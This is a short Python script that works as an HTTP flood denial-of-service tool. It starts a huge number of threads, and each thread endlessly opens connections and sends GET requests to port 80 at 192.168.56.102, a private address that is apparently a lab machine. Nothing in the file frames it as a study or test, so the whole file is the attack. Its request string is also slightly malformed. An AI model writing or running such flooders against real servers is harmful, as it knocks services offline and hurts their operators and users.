import socket
import threading

target_ip = "192.168.56.102"
target_port = 80

def attack():
    while True:
        for _ in range(100):
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                client.connect((target_ip, target_port))
                client.sendto(b'GET / HTTP/1.1\r\nHost: ' + target_ip.encode() + b'\r\n\r\b', (target_ip, target_port))
                client.close()
            except socket.error:
                print("connection failed")
                client.close()

for i in range (100000000):
    thread = threading.Thread(target=attack)
    thread.start()